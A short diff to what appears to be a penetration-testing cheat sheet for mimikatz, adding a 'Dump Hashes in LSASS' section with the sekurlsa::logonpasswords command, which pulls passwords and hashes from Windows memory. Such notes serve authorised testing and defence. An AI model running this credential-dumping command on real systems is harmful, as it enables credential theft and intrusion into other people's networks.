@@ -35,3 +35,9 @@ mimikatz # privilege::debug
 # List available options
 mimikatz # sekurlsa::
 ```
+
+### **Dump Hashes in LSASS**  
+
+```powershell
+mimikatz # sekurlsa::logonpasswords
+```
